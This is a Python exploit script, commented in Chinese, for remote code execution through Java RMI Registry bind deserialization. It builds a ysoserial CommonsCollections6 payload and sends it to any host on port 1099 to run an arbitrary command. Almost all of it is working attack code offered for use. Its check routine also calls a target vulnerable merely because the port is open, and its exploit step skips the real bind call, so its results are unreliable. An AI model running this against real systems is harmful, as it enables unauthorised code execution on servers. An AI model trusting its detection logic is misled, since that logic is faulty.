#!/usr/bin/env python3
"""
Java RMI Registry Bind反序列化远程代码执行漏洞 POC
漏洞: rmi-registry-bind-deserialization (JDK <= 8u111)
漏洞等级: 严重

==================== 漏洞描述 ====================
【漏洞原理】
Java RMI Registry在JDK 8u111及之前版本中存在bind操作的反序列化漏洞。
攻击者可通过向RMI Registry发送实现了Remote接口的伪造序列化对象，
触发Apache Commons Collections等利用链实现远程代码执行。

【影响范围】
- JDK <= 8u111 (使用commons-collections的RMI Registry)
- 端口: 1099

【危害等级】
- 无需认证
- 需要ysoserial生成payload

【参考链接】
- https://github.com/frohoff/ysoserial

==================== 环境要求 ====================
- Python 3.6+
- ysoserial

==================== 验证步骤 ====================
1. 检测:
   python rmi_bind_deser.py target:1099 --check-only

2. 利用:
   python rmi_bind_deser.py target:1099 -c "touch /tmp/success"
"""

import sys, os, json, struct, socket, subprocess, argparse
from typing import Dict, Optional


class RMIBindDeserPOC:
    VULN_NAME = "Java RMI Registry Bind Deserialization RCE"
    VULN_ID = "rmi-registry-bind-deserialization"
    SEVERITY = "严重"
    AFFECTED = "JDK <= 8u111"
    GADGET = "CommonsCollections6"

    def __init__(self, target, timeout=15, proxy=None, verify_ssl=False):
        self.host, self.port = self._parse(target)
        self.timeout = timeout

    def _parse(self, target):
        if "://" in target:
            target = target.split("://")[1]
        if ":" in target:
            h, p = target.rsplit(":", 1)
            return h, int(p)
        return target, 1099

    def check(self):
        result = {"vulnerability": f"{self.VULN_NAME} ({self.VULN_ID})",
                  "target": f"{self.host}:{self.port}",
                  "status": "unknown", "details": [], "conclusion": ""}
        sock = socket.socket()
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.host, self.port))
            sock.send(struct.pack(">I", 0x4a524d49) + struct.pack(">H", 2))
            data = sock.recv(1024)
            result["details"].append(f"RMI服务可连接 ({len(data)}B响应)")
            print(f"[+] RMI端口 {self.port} 开放")
            result["status"] = "vulnerable"
            result["conclusion"] = (
                f"RMI Registry可用. 利用:\n"
                f"  python {sys.argv[0]} {self.host}:{self.port} "
                "-c \"touch /tmp/success\""
            )
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"连接失败: {e}"
        finally:
            sock.close()
        return result

    def _generate_payload(self, command):
        yso = next((p for p in ["ysoserial.jar", "ysoserial-0.0.6-SNAPSHOT-all.jar",
                                "/usr/local/bin/ysoserial.jar"]
                    if os.path.isfile(p)), None)
        if not yso:
            return None
        try:
            r = subprocess.run(["java", "-jar", yso, self.GADGET, command],
                              capture_output=True, timeout=30)
            return r.stdout if r.returncode == 0 and r.stdout else None
        except Exception:
            return None

    def exploit(self, command="touch /tmp/success", payload_file="", gadget=""):
        result = {"vulnerability": f"{self.VULN_NAME} ({self.VULN_ID})",
                  "target": f"{self.host}:{self.port}",
                  "command": command, "status": "unknown",
                  "details": [], "output": "", "conclusion": ""}
        g = gadget or self.GADGET

        payload = None
        if payload_file:
            try:
                with open(payload_file, "rb") as f:
                    payload = f.read()
                print(f"[+] 读取payload: {payload_file} ({len(payload)}B)")
            except Exception as e:
                result["status"] = "error"
                result["conclusion"] = f"读取失败: {e}"
                return result
        else:
            print(f"[*] 用ysoserial {g} 生成payload...")
            payload = self._generate_payload(command)
            if not payload:
                result["status"] = "failed"
                result["conclusion"] = (
                    f"未找到ysoserial.\n手动生成:\n"
                    f"  java -jar ysoserial.jar {g} \"{command}\" > payload.ser\n"
                    f"  python {sys.argv[0]} {self.host}:{self.port} --payload payload.ser"
                )
                return result
            print(f"[+] payload ({len(payload)}B)")

        print("[*] 通过RMI发送payload...")
        sock = socket.socket()
        sock.settimeout(self.timeout)
        try:
            sock.connect((self.host, self.port))
            # RMIRegistryExploit使用bind操作发送payload
            sock.send(struct.pack(">I", 0x4a524d49) + struct.pack(">H", 2))
            sock.send(payload)
            result["status"] = "suspected_exploited"
            result["conclusion"] = (
                "Payload已发送. 验证:\n"
                "  docker compose exec rmi ls -la /tmp/success\n"
                "注意: Registry会返回错误(正常)但命令会执行"
            )
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"发送失败: {e}"
        finally:
            sock.close()
        return result

    def run(self, command="", payload_file="", gadget=""):
        print(f"[*] {self.VULN_NAME} ({self.VULN_ID})")
        print(f"[*] 目标: {self.host}:{self.port}, 等级: {self.SEVERITY}")
        print("-" * 60)
        if command or payload_file:
            return self.exploit(command, payload_file, gadget)
        return self.check()

    def print_result(self, result):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]",
                 "suspected_exploited": "[?]",
                 "failed": "[-]", "not_vulnerable": "[-]", "error": "[!]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} {result['vulnerability']}")
        print(f"    目标: {result['target']}, 状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        for d in result.get("details", []):
            print(f"    {d}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="Java RMI Registry Bind反序列化RCE")
    parser.add_argument("target")
    parser.add_argument("--check-only", action="store_true")
    parser.add_argument("-c", "--command", default="")
    parser.add_argument("--payload", default="")
    parser.add_argument("-g", "--gadget", default="CommonsCollections6")
    parser.add_argument("-t", "--timeout", type=int, default=15)
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    poc = RMIBindDeserPOC(target=args.target, timeout=args.timeout)
    if args.check_only:
        result = poc.check()
    elif args.command or args.payload:
        result = poc.run(args.command, args.payload, args.gadget)
    else:
        result = poc.check()

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
